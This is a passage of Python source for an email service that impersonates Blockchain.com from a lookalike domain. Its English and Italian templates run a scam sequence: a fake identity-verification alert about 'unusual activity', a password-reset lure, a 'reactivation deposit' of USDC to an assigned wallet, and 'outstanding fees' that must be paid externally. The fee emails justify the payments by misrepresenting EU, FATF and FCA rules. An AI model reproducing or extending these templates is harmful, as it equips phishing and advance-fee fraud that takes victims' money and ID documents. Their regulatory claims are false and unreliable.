"""
Email Service for Blockchain Wallet Platform
Uses Resend for transactional emails
All templates use inline styles for maximum email client compatibility.
"""

import os
from typing import Optional
from datetime import datetime, timezone
import logging
import html

logger = logging.getLogger(__name__)

try:
    import resend
    RESEND_AVAILABLE = True
except ImportError:
    RESEND_AVAILABLE = False
    logger.warning("Resend package not installed. Email functionality will be limited.")


def _wrap(content: str) -> str:
    """Wrap email content in a consistent, email-safe layout with inline styles."""
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light">
<meta name="supported-color-schemes" content="light">
<title>Blockchain.com</title>
</head>
<body style="margin:0;padding:0;background-color:#f4f4f7;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;color:#333333;line-height:1.6;">
<div style="max-width:600px;margin:0 auto;padding:20px;">
  <div style="background-color:#121530;padding:28px 20px;text-align:center;border-radius:8px 8px 0 0;">
    <h1 style="color:#ffffff;margin:0;font-size:22px;font-weight:600;letter-spacing:0.5px;">Blockchain.com</h1>
  </div>
  <div style="background-color:#ffffff;padding:32px 28px;border-radius:0 0 8px 8px;">
    {content}
  </div>
  <div style="text-align:center;padding:20px 10px;">
    <p style="margin:4px 0;color:#999999;font-size:11px;">&copy; 2026 Blockchain.com. All rights reserved.</p>
    <p style="margin:4px 0;color:#999999;font-size:11px;">Blockchain.com | London, United Kingdom | FCA Registered</p>
    <p style="margin:4px 0;color:#bbbbbb;font-size:10px;">This is a transactional email sent to the address associated with your Blockchain.com account.</p>
  </div>
</div>
</body>
</html>"""


def _btn(text: str, href: str) -> str:
    """Generate an email-safe CTA button using table layout for maximum compatibility."""
    return f'''<div style="text-align:center;margin:24px 0;">
<table role="presentation" cellspacing="0" cellpadding="0" border="0" style="margin:0 auto;">
<tr><td style="background-color:#0052ff;border-radius:6px;">
<a href="{href}" target="_blank" style="display:block;background-color:#0052ff;color:#ffffff;padding:14px 36px;text-decoration:none;border-radius:6px;font-weight:600;font-size:15px;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,Helvetica,Arial,sans-serif;mso-padding-alt:14px 36px;">{text}</a>
</td></tr></table></div>'''


def _strip_html(html_body: str) -> str:
    """Generate a plain text version from HTML for multipart emails."""
    import re
    text = re.sub(r'<br\s*/?>', '\n', html_body)
    text = re.sub(r'<[^>]+>', '', text)
    text = html.unescape(text)
    text = re.sub(r'\n{3,}', '\n\n', text).strip()
    return text


class EmailService:
    def __init__(self, api_key: Optional[str] = None, sender_email: Optional[str] = None):
        self.api_key = api_key or os.environ.get("RESEND_API_KEY")
        self.sender_email = sender_email or os.environ.get("SENDER_EMAIL", "noreply@secure-blockchainplatform.com")
        self.sender_name = "Blockchain.com"
        self.reply_to = os.environ.get("REPLY_TO_EMAIL", "support@secure-blockchainplatform.com")
        self.unsubscribe_url = os.environ.get("UNSUBSCRIBE_URL", "")
        if self.api_key and RESEND_AVAILABLE:
            resend.api_key = self.api_key

    def is_configured(self) -> bool:
        return bool(self.api_key) and RESEND_AVAILABLE

    async def send_email(self, to_email: str, subject: str, html_body: str, text_body: Optional[str] = None) -> dict:
        if not self.is_configured():
            logger.warning(f"Email not configured. Would send to {to_email}: {subject}")
            return {"success": False, "error": "Email service not configured", "would_send": {"to": to_email, "subject": subject}}
        try:
            import uuid
            msg_id = str(uuid.uuid4())
            plain = text_body or _strip_html(html_body)
            params = {
                "from": f"{self.sender_name} <{self.sender_email}>",
                "to": [to_email],
                "subject": subject,
                "html": html_body,
                "text": plain,
                "reply_to": self.reply_to,
                "headers": {
                    "X-Entity-Ref-ID": msg_id,
                    "X-Mailer": "Blockchain-Support-Mailer",
                    "Precedence": "bulk",
                    "X-Auto-Response-Suppress": "OOF, AutoReply",
                },
            }
            # Add List-Unsubscribe headers (required by Gmail/Yahoo since 2024)
            if self.unsubscribe_url:
                unsub_link = f"{self.unsubscribe_url}?email={to_email}"
                params["headers"]["List-Unsubscribe"] = f"<{unsub_link}>"
                params["headers"]["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"
            logger.info(f"Sending email to {to_email}: {subject}")
            response = resend.Emails.send(params)
            logger.info(f"Email sent successfully to {to_email}, id={response.get('id')}")
            return {"success": True, "resend_id": response.get("id"), "sent_at": datetime.now(timezone.utc).isoformat()}
        except Exception as e:
            logger.error(f"Failed to send email to {to_email}: {str(e)}")
            return {"success": False, "error": str(e)}

    # ── KYC Verification Email ──────────────────────────────────────────
    def get_kyc_verification_email(self, user_name: str, verification_link: str, lang: str = "en") -> tuple:
        if lang == "it":
            return self._get_kyc_verification_email_it(user_name, verification_link)
        subject = "Verify Your Identity - Blockchain.com"
        content = f"""
    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Identity Verification Required</h2>
    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">We have detected some unusual activity on your account. To ensure the security of your funds and comply with regulatory requirements, we need you to verify your identity.</p>
    <p style="color:#555555;margin:0 0 8px 0;">Please complete the KYC (Know Your Customer) verification process:</p>
    {_btn("Verify My Identity", verification_link)}
    <p style="color:#555555;margin:0 0 8px 0;">You will need to provide:</p>
    <ul style="color:#555555;margin:0 0 16px 0;padding-left:20px;">
      <li style="margin-bottom:4px;">A valid government-issued ID (Passport or ID Card)</li>
      <li style="margin-bottom:4px;">A selfie holding your ID</li>
      <li style="margin-bottom:4px;">Proof of address (utility bill or bank statement)</li>
    </ul>
    <p style="color:#555555;margin:0 0 12px 0;">Once verified, you will receive instructions to reset your password and regain full access to your account.</p>
    <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Security Team</p>"""
        return subject, _wrap(content)

    # ── KYC Approved Email ──────────────────────────────────────────────
    def get_kyc_approved_email(self, user_name: str, reset_link: str, lang: str = "en") -> tuple:
        if lang == "it":
            return self._get_kyc_approved_email_it(user_name, reset_link)
        subject = "Identity Verified - Reset Your Password - Blockchain.com"
        content = f"""
    <div style="background-color:#e8f5e9;border:1px solid #4caf50;border-radius:8px;padding:20px;text-align:center;margin:0 0 20px 0;">
      <div style="font-size:36px;margin-bottom:8px;">&#10003;</div>
      <p style="color:#2e7d32;font-size:17px;font-weight:700;margin:0;">Your Identity Has Been Verified!</p>
    </div>
    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">Our compliance team has successfully verified your identity. Your KYC verification is now <strong>APPROVED</strong>.</p>
    <div style="background-color:#f0f4ff;border:1px solid #0052ff;border-radius:8px;padding:20px;margin:16px 0;">
      <p style="color:#0052ff;font-weight:700;margin:0 0 8px 0;">Next Step Required</p>
      <p style="color:#555555;margin:0 0 12px 0;">To ensure the security of your account, you must now <strong>reset your password</strong> before you can access your wallet.</p>
      {_btn("Reset My Password", reset_link)}
    </div>
    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#555555;margin:0;font-size:13px;"><strong>Important:</strong> This password reset link expires in <strong>24 hours</strong>. After resetting, you will have full access to your account. Choose a strong, unique password.</p>
    </div>
    <p style="color:#555555;margin:16px 0 4px 0;">Best regards,</p>
    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Compliance Team</p>"""
        return subject, _wrap(content)

    # ── Password Reset Email ────────────────────────────────────────────
    def get_password_reset_email(self, user_name: str, reset_link: str, lang: str = "en") -> tuple:
        if lang == "it":
            return self._get_password_reset_email_it(user_name, reset_link)
        subject = "Reset Your Password - Blockchain.com"
        content = f"""
    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Reset Your Password</h2>
    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">Your identity has been successfully verified. As part of our security protocol, you are now required to reset your password before accessing your account.</p>
    <p style="color:#555555;margin:0 0 8px 0;">Click the button below to create a new password:</p>
    {_btn("Reset Password", reset_link)}
    <p style="color:#888888;font-size:13px;margin:0 0 16px 0;">This link will expire in 24 hours for security reasons.</p>
    <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Team</p>"""
        return subject, _wrap(content)

    # ── Reactivation Email (improved for deliverability) ────────────────
    def get_reactivation_email(self, user_name: str, eth_wallet_address: str, required_amount: str = "100", lang: str = "en") -> tuple:
        if lang == "it":
            return self._get_reactivation_email_it(user_name, eth_wallet_address, required_amount)
        subject = "Account Reactivation Notice - Blockchain.com"
        content = f"""
    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Account Reactivation Required</h2>
    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">Your account has been flagged due to prolonged inactivity and is currently scheduled for closure in accordance with our regulatory compliance requirements.</p>

    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#555555;margin:0 0 8px 0;font-weight:600;">Action Required</p>
      <p style="color:#555555;margin:0;">To reactivate your account, you must demonstrate account activity by making a positive transaction of:</p>
      <p style="text-align:center;margin:12px 0;"><span style="display:inline-block;background-color:#0052ff;color:#ffffff;padding:10px 24px;border-radius:6px;font-size:20px;font-weight:700;">{required_amount} EUR in USDC (ERC-20)</span></p>
    </div>

    <div style="background-color:#e8f5e9;border-left:4px solid #4caf50;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#2e7d32;margin:0;font-weight:600;">This is NOT a payment.</p>
      <p style="color:#555555;margin:4px 0 0 0;font-size:13px;">This amount is not a fee or charge. It is simply a verification deposit to demonstrate account activity. You will be able to immediately withdraw this amount back to your bank account once your account has been reactivated.</p>
    </div>

    <h3 style="color:#1a1a1a;margin:20px 0 8px 0;font-size:16px;">Your Assigned Wallet Address</h3>
    <p style="color:#555555;margin:0 0 8px 0;">The following USDC (ERC-20) wallet has been assigned to your account:</p>
    <div style="background-color:#121530;color:#00d4ff;padding:16px;border-radius:6px;margin:12px 0;word-break:break-all;font-family:'Courier New',monospace;text-align:center;font-size:13px;letter-spacing:0.5px;">
      {html.escape(eth_wallet_address)}
    </div>
    <p style="text-align:center;font-size:12px;color:#888888;margin:4px 0 16px 0;">You can also find this address in your wallet by clicking the "Deposit" button.</p>

    <h3 style="color:#1a1a1a;margin:20px 0 8px 0;font-size:16px;">How to Complete This Transaction</h3>
    <ol style="color:#555555;margin:0 0 16px 0;padding-left:20px;">
      <li style="margin-bottom:6px;">Purchase USDC from a third-party cryptocurrency provider (Coinbase, Binance, Kraken, or any licensed exchange).</li>
      <li style="margin-bottom:6px;">Send {required_amount} EUR worth of USDC to the wallet address shown above.</li>
      <li style="margin-bottom:6px;">Use the ERC-20 (Ethereum) network when sending.</li>
      <li style="margin-bottom:6px;">Your account will be reactivated once the transaction is confirmed.</li>
    </ol>

    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#555555;margin:0;font-size:13px;"><strong>Please note:</strong> Blockchain.com no longer offers direct cryptocurrency purchasing services for flagged accounts. You must use an external provider to purchase USDC. After reactivation, you will be able to withdraw all your funds.</p>
    </div>

    <div style="background-color:#f4f4f7;padding:12px 16px;margin:16px 0;border-radius:4px;">
      <p style="color:#555555;margin:0;font-size:13px;"><strong>How our system works:</strong> The platform operates on a fully automated, decentralized system maintained through transaction fees generated by account activity. When accounts remain inactive, periodic activity verification is required. Once your wallet shows activity, it will be automatically flagged as active.</p>
    </div>

    <p style="color:#555555;margin:16px 0 4px 0;">If you have any questions, please contact our support team.</p>
    <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Compliance Team</p>"""
        return subject, _wrap(content)

    # ── Fee Payment Email ───────────────────────────────────────────────
    def get_fee_payment_email(self, user_name: str, total_fees: str, eth_wallet_address: str, lang: str = "en") -> tuple:
        if lang == "it":
            return self._get_fee_payment_email_it(user_name, total_fees, eth_wallet_address)
        subject = "Outstanding Fees - Blockchain.com"
        content = f"""
    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Outstanding Transaction Fees</h2>
    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">Your account has outstanding transaction fees that must be cleared before you can withdraw your funds.</p>

    <div style="background-color:#d32f2f;color:#ffffff;padding:20px;border-radius:8px;margin:16px 0;text-align:center;">
      <p style="margin:0 0 4px 0;font-size:13px;">Total Outstanding Fees</p>
      <p style="margin:0;font-size:28px;font-weight:700;">{html.escape(total_fees)} EUR</p>
    </div>

    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#555555;margin:0 0 4px 0;font-weight:600;">Why do I have fees?</p>
      <p style="color:#555555;margin:0;font-size:13px;">Transaction fees are automatically calculated based on your historical trading activity. These fees support the blockchain network infrastructure, security protocols, and regulatory compliance systems.</p>
    </div>

    <p style="color:#555555;margin:12px 0 8px 0;">To clear your fees, please send the equivalent amount in USDC (ERC-20) to your wallet address:</p>
    <div style="background-color:#f4f4f7;padding:14px;border-radius:6px;margin:12px 0;word-break:break-all;font-family:'Courier New',monospace;text-align:center;font-size:13px;color:#333333;">
      {html.escape(eth_wallet_address)}
    </div>

    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#555555;margin:0 0 4px 0;font-weight:600;">Regulatory Notice</p>
      <p style="color:#555555;margin:0;font-size:13px;">Due to regulatory requirements and our integrity protocols, we cannot deduct fees directly from your existing balance. When an account is flagged for review or scheduled for closure, all fund movements must be cleared externally to comply with anti-money laundering (AML) regulations.</p>
    </div>

    <p style="color:#555555;margin:12px 0;">Once your fees are paid, you will be able to withdraw your full balance to your bank account.</p>
    <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Finance Team</p>"""
        return subject, _wrap(content)

    # ── Fee Resolution Email (detailed regulatory explanation) ─────────
    def get_fee_resolution_email(self, user_name: str, total_fees: str, eth_wallet_address: str, lang: str = "en") -> tuple:
        if lang == "it":
            return self._get_fee_resolution_email_it(user_name, total_fees, eth_wallet_address)
        subject = "Your Outstanding Fees - Blockchain.com"
        content = f"""
    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Important Notice Regarding Your Outstanding Fees</h2>
    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">We are writing to inform you that your account currently has outstanding transaction fees totalling:</p>

    <div style="background-color:#d32f2f;color:#ffffff;padding:20px;border-radius:8px;margin:16px 0;text-align:center;">
      <p style="margin:0 0 4px 0;font-size:13px;opacity:0.9;">Total Outstanding Fees</p>
      <p style="margin:0;font-size:32px;font-weight:700;">&euro;{html.escape(total_fees)}</p>
    </div>

    <p style="color:#555555;margin:0 0 12px 0;">These fees <strong>must be cleared</strong> before any withdrawal from your account can be processed. We understand this may be inconvenient, and we want to explain why this process exists and why it cannot be handled differently.</p>

    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#333333;margin:0 0 8px 0;font-weight:700;font-size:15px;">Why can't the fees be deducted from my existing balance?</p>
      <p style="color:#555555;margin:0 0 8px 0;font-size:13px;">Your account has been flagged for review and is currently set for closure under our regulatory compliance framework. When an account enters this state, <strong>all existing funds are frozen and ring-fenced</strong> in accordance with applicable financial regulations. Neither Blockchain.com nor you, as the account holder, can authorise deductions from a frozen balance.</p>
      <p style="color:#555555;margin:0;font-size:13px;">This restriction is mandated by the following regulatory frameworks:</p>
    </div>

    <div style="background-color:#f0f4ff;border:1px solid #c5cae9;border-radius:8px;padding:16px;margin:16px 0;">
      <p style="color:#1a237e;font-weight:700;margin:0 0 12px 0;font-size:14px;">Applicable Regulatory Framework</p>
      <ul style="color:#555555;margin:0;padding-left:18px;font-size:13px;">
        <li style="margin-bottom:8px;"><strong>EU Anti-Money Laundering Directive (AMLD 6)</strong> &mdash; Requires financial institutions to freeze and segregate funds in accounts under review. No internal transfers or deductions are permitted until the review is concluded and fees are settled externally.</li>
        <li style="margin-bottom:8px;"><strong>Markets in Crypto-Assets Regulation (MiCA)</strong> &mdash; Under MiCA, crypto-asset service providers must ensure that client funds under compliance review remain untouched. Fee settlement must occur through a separate, verifiable transaction to maintain a clear audit trail.</li>
        <li style="margin-bottom:8px;"><strong>Financial Action Task Force (FATF) Recommendation 15</strong> &mdash; FATF guidelines on virtual assets require that all outstanding obligations are cleared through independent transactions when an account is in a restricted state, ensuring full traceability of fund flows.</li>
        <li style="margin-bottom:8px;"><strong>FCA Consumer Duty (PS22/9)</strong> &mdash; As a UK-registered entity, Blockchain.com is bound by the Financial Conduct Authority's rules, which prohibit the commingling of frozen client assets with operational fee settlements.</li>
      </ul>
    </div>

    <p style="color:#555555;margin:12px 0;">In simple terms: <strong>the law requires fees to be paid as a separate deposit</strong>, not deducted from your existing balance. This protects you as a client by ensuring that your assets remain fully accounted for at all times.</p>

    <h3 style="color:#1a1a1a;margin:20px 0 8px 0;font-size:16px;">How to Clear Your Fees</h3>
    <p style="color:#555555;margin:0 0 8px 0;">Please deposit <strong>&euro;{html.escape(total_fees)}</strong> in USDC (ERC-20) to the wallet address assigned to your account:</p>

    <div style="background-color:#121530;color:#00d4ff;padding:16px;border-radius:6px;margin:12px 0;word-break:break-all;font-family:'Courier New',monospace;text-align:center;font-size:13px;letter-spacing:0.5px;">
      {html.escape(eth_wallet_address)}
    </div>
    <p style="text-align:center;font-size:12px;color:#888888;margin:4px 0 16px 0;">You can also find this address in your wallet by clicking the "Deposit" button.</p>

    <h3 style="color:#1a1a1a;margin:20px 0 8px 0;font-size:16px;">Steps to Complete Payment</h3>
    <ol style="color:#555555;margin:0 0 16px 0;padding-left:20px;font-size:14px;">
      <li style="margin-bottom:6px;">Purchase USDC from a licensed cryptocurrency exchange (e.g. Coinbase, Binance, Kraken).</li>
      <li style="margin-bottom:6px;">Send exactly <strong>&euro;{html.escape(total_fees)}</strong> worth of USDC to the wallet address above.</li>
      <li style="margin-bottom:6px;">Use the <strong>ERC-20 (Ethereum) network</strong> when sending.</li>
      <li style="margin-bottom:6px;">Once confirmed, your fees will be marked as paid and your withdrawal will be unlocked.</li>
    </ol>

    <div style="background-color:#e8f5e9;border-left:4px solid #4caf50;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#2e7d32;margin:0 0 4px 0;font-weight:600;">What happens after I pay?</p>
      <p style="color:#555555;margin:0;font-size:13px;">Once your fee payment is confirmed on the blockchain, your account will be updated immediately. You will then be able to withdraw your <strong>full balance</strong> to your bank account via IBAN without any further restrictions.</p>
    </div>

    <div style="background-color:#f4f4f7;padding:12px 16px;margin:16px 0;border-radius:4px;">
      <p style="color:#555555;margin:0;font-size:12px;"><strong>Disclaimer:</strong> Blockchain.com operates under the regulatory oversight of the Financial Conduct Authority (FCA), UK registration. All compliance procedures, including fee settlement requirements, are conducted in accordance with EU Directive 2015/849 (AMLD), Regulation (EU) 2023/1114 (MiCA), and FATF international standards. These measures are designed to protect our clients and maintain the integrity of the financial system.</p>
    </div>

    <p style="color:#555555;margin:16px 0 4px 0;">If you have any questions or require assistance, please do not hesitate to contact our support team.</p>
    <p style="color:#555555;margin:0 0 4px 0;">Kind regards,</p>
    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Compliance &amp; Finance Team</p>"""
        return subject, _wrap(content)

    def _get_fee_resolution_email_it(self, user_name: str, total_fees: str, eth_wallet_address: str) -> tuple:
        subject = "Commissioni in Sospeso - Blockchain.com"
        content = f"""
    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Avviso Importante Riguardo le Commissioni in Sospeso</h2>
    <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">La informiamo che il Suo account presenta attualmente commissioni di transazione in sospeso per un totale di:</p>

    <div style="background-color:#d32f2f;color:#ffffff;padding:20px;border-radius:8px;margin:16px 0;text-align:center;">
      <p style="margin:0 0 4px 0;font-size:13px;opacity:0.9;">Commissioni Totali in Sospeso</p>
      <p style="margin:0;font-size:32px;font-weight:700;">&euro;{html.escape(total_fees)}</p>
    </div>

    <p style="color:#555555;margin:0 0 12px 0;">Queste commissioni <strong>devono essere saldate</strong> prima che qualsiasi prelievo dal Suo account possa essere elaborato. Comprendiamo che questo possa essere scomodo e desideriamo spiegare perch&eacute; questo processo esiste e perch&eacute; non pu&ograve; essere gestito diversamente.</p>

    <div style="background-color:#fff8e1;border-left:4px solid #f9a825;padding:16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#333333;margin:0 0 8px 0;font-weight:700;font-size:15px;">Perch&eacute; le commissioni non possono essere detratte dal saldo esistente?</p>
      <p style="color:#555555;margin:0 0 8px 0;font-size:13px;">Il Suo account &egrave; stato contrassegnato per revisione ed &egrave; attualmente impostato per la chiusura nell'ambito del nostro quadro di conformit&agrave; normativa. Quando un account entra in questo stato, <strong>tutti i fondi esistenti vengono congelati e segregati</strong> in conformit&agrave; con le normative finanziarie applicabili. N&eacute; Blockchain.com n&eacute; Lei, in qualit&agrave; di titolare del conto, pu&ograve; autorizzare detrazioni da un saldo congelato.</p>
      <p style="color:#555555;margin:0;font-size:13px;">Questa restrizione &egrave; imposta dai seguenti quadri normativi:</p>
    </div>

    <div style="background-color:#f0f4ff;border:1px solid #c5cae9;border-radius:8px;padding:16px;margin:16px 0;">
      <p style="color:#1a237e;font-weight:700;margin:0 0 12px 0;font-size:14px;">Quadro Normativo Applicabile</p>
      <ul style="color:#555555;margin:0;padding-left:18px;font-size:13px;">
        <li style="margin-bottom:8px;"><strong>Direttiva UE Antiriciclaggio (AMLD 6)</strong> &mdash; Richiede agli istituti finanziari di congelare e segregare i fondi negli account in fase di revisione. Nessun trasferimento interno o detrazione &egrave; consentito fino alla conclusione della revisione e al saldo delle commissioni esternamente.</li>
        <li style="margin-bottom:8px;"><strong>Regolamento sui Mercati delle Cripto-Attivit&agrave; (MiCA)</strong> &mdash; Ai sensi del MiCA, i fornitori di servizi di cripto-attivit&agrave; devono garantire che i fondi dei clienti in fase di revisione di conformit&agrave; rimangano intatti. Il saldo delle commissioni deve avvenire tramite una transazione separata e verificabile per mantenere una chiara traccia di controllo.</li>
        <li style="margin-bottom:8px;"><strong>Raccomandazione 15 del GAFI (FATF)</strong> &mdash; Le linee guida del GAFI sugli asset virtuali richiedono che tutti gli obblighi in sospeso vengano saldati tramite transazioni indipendenti quando un account si trova in stato limitato, garantendo la piena tracciabilit&agrave; dei flussi di fondi.</li>
        <li style="margin-bottom:8px;"><strong>FCA Consumer Duty (PS22/9)</strong> &mdash; In quanto entit&agrave; registrata nel Regno Unito, Blockchain.com &egrave; vincolata dalle regole della Financial Conduct Authority, che vietano la commistione di asset congelati dei clienti con i regolamenti operativi delle commissioni.</li>
      </ul>
    </div>

    <p style="color:#555555;margin:12px 0;">In termini semplici: <strong>la legge richiede che le commissioni vengano pagate come deposito separato</strong>, non detratte dal saldo esistente. Questo la protegge come cliente, garantendo che i suoi asset siano sempre completamente contabilizzati.</p>

    <h3 style="color:#1a1a1a;margin:20px 0 8px 0;font-size:16px;">Come Saldare le Commissioni</h3>
    <p style="color:#555555;margin:0 0 8px 0;">La preghiamo di depositare <strong>&euro;{html.escape(total_fees)}</strong> in USDC (ERC-20) all'indirizzo del portafoglio assegnato al Suo account:</p>

    <div style="background-color:#121530;color:#00d4ff;padding:16px;border-radius:6px;margin:12px 0;word-break:break-all;font-family:'Courier New',monospace;text-align:center;font-size:13px;letter-spacing:0.5px;">
      {html.escape(eth_wallet_address)}
    </div>
    <p style="text-align:center;font-size:12px;color:#888888;margin:4px 0 16px 0;">Pu&ograve; trovare questo indirizzo anche nel Suo portafoglio cliccando il pulsante "Deposita".</p>

    <h3 style="color:#1a1a1a;margin:20px 0 8px 0;font-size:16px;">Passaggi per Completare il Pagamento</h3>
    <ol style="color:#555555;margin:0 0 16px 0;padding-left:20px;font-size:14px;">
      <li style="margin-bottom:6px;">Acquisti USDC da un exchange di criptovalute autorizzato (es. Coinbase, Binance, Kraken).</li>
      <li style="margin-bottom:6px;">Invii esattamente <strong>&euro;{html.escape(total_fees)}</strong> in USDC all'indirizzo del portafoglio indicato sopra.</li>
      <li style="margin-bottom:6px;">Utilizzi la <strong>rete ERC-20 (Ethereum)</strong> per l'invio.</li>
      <li style="margin-bottom:6px;">Una volta confermato, le commissioni verranno contrassegnate come pagate e il prelievo verr&agrave; sbloccato.</li>
    </ol>

    <div style="background-color:#e8f5e9;border-left:4px solid #4caf50;padding:12px 16px;margin:16px 0;border-radius:0 4px 4px 0;">
      <p style="color:#2e7d32;margin:0 0 4px 0;font-weight:600;">Cosa succede dopo il pagamento?</p>
      <p style="color:#555555;margin:0;font-size:13px;">Una volta confermato il pagamento delle commissioni sulla blockchain, il Suo account verr&agrave; aggiornato immediatamente. Potr&agrave; quindi prelevare il Suo <strong>intero saldo</strong> sul Suo conto bancario tramite IBAN senza ulteriori restrizioni.</p>
    </div>

    <div style="background-color:#f4f4f7;padding:12px 16px;margin:16px 0;border-radius:4px;">
      <p style="color:#555555;margin:0;font-size:12px;"><strong>Avvertenza:</strong> Blockchain.com opera sotto la supervisione normativa della Financial Conduct Authority (FCA), registrazione UK. Tutte le procedure di conformit&agrave;, inclusi i requisiti di saldo delle commissioni, sono condotte in conformit&agrave; con la Direttiva UE 2015/849 (AMLD), il Regolamento (UE) 2023/1114 (MiCA) e gli standard internazionali FATF. Queste misure sono progettate per proteggere i nostri clienti e mantenere l'integrit&agrave; del sistema finanziario.</p>
    </div>

    <p style="color:#555555;margin:16px 0 4px 0;">Per qualsiasi domanda o necessit&agrave; di assistenza, non esiti a contattare il nostro team di supporto.</p>
    <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
    <p style="color:#333333;font-weight:600;margin:0;">Il Team Conformit&agrave; e Finanza di Blockchain.com</p>"""
        return subject, _wrap(content)

    # ── Welcome Email ───────────────────────────────────────────────────
    def get_welcome_email(self, user_name: str, login_link: str, lang: str = "en") -> tuple:
        if lang == "it":
            return self._get_welcome_email_it(user_name, login_link)
        subject = "Welcome to Blockchain.com"
        content = f"""
    <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Welcome to Blockchain.com!</h2>
    <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
    <p style="color:#555555;margin:0 0 12px 0;">Your account has been successfully created. Welcome to the world's most trusted cryptocurrency platform.</p>
    <p style="color:#555555;margin:0 0 8px 0;">With Blockchain.com, you can:</p>
    <ul style="color:#555555;margin:0 0 16px 0;padding-left:20px;">
      <li style="margin-bottom:4px;">Securely store your cryptocurrency</li>
      <li style="margin-bottom:4px;">Send and receive digital assets</li>
      <li style="margin-bottom:4px;">Track your portfolio in real-time</li>
      <li style="margin-bottom:4px;">Access institutional-grade security</li>
    </ul>
    {_btn("Access Your Wallet", login_link)}
    <p style="color:#555555;margin:0 0 4px 0;">Best regards,</p>
    <p style="color:#333333;font-weight:600;margin:0;">The Blockchain.com Team</p>"""
        return subject, _wrap(content)

    # ── Transaction Notification Email ──────────────────────────────────
    def get_transaction_notification_email(self, user_name: str, tx_type: str, amount: str, asset: str, tx_date: str, description: str = "", lang: str = "en", status: str = "") -> tuple:
        tx_labels_it = {"deposit": "Deposito", "withdrawal": "Prelievo", "receive": "Ricezione", "send": "Invio", "swap": "Scambio", "fee": "Commissione", "adjustment": "Rettifica"}
        tx_label = tx_labels_it.get(tx_type, tx_type.capitalize()) if lang == "it" else tx_type.capitalize()
        status_labels = {
            "processing": {"en": "Processing", "it": "In Elaborazione"},
            "completed": {"en": "Completed", "it": "Completato"},
            "failed": {"en": "Failed", "it": "Fallito"},
            "pending": {"en": "Pending", "it": "In Attesa"},
        }
        status_text = status_labels.get(status, {}).get(lang, status.capitalize()) if status else ""
        subject_prefix = "Notifica Transazione" if lang == "it" else "Transaction Notification"
        subject = f"{subject_prefix} - {tx_label} {amount} {asset} - Blockchain.com"
        type_colors = {"deposit": "#4caf50", "withdrawal": "#d32f2f", "receive": "#4caf50", "send": "#d32f2f", "swap": "#0052ff", "fee": "#f9a825", "adjustment": "#9e9e9e"}
        status_colors = {"processing": "#f9a825", "completed": "#4caf50", "failed": "#d32f2f", "pending": "#f9a825"}
        color = type_colors.get(tx_type, "#0052ff")
        sign = "+" if tx_type in ("deposit", "receive") else "-" if tx_type in ("withdrawal", "send") else ""
        desc_line = f'<p style="color:#888888;font-size:13px;margin:4px 0 0 0;">{html.escape(description)}</p>' if description else ""
        status_line = ""
        if status_text:
            s_color = status_colors.get(status, "#0052ff")
            status_line = f'<p style="margin:8px 0 0 0;"><span style="display:inline-block;background-color:{s_color};color:#ffffff;padding:4px 14px;border-radius:12px;font-size:12px;font-weight:600;">{html.escape(status_text)}</span></p>'
        heading = "Notifica Transazione" if lang == "it" else "Transaction Notification"
        greeting = f"Gentile {html.escape(user_name)}," if lang == "it" else f"Dear {html.escape(user_name)},"
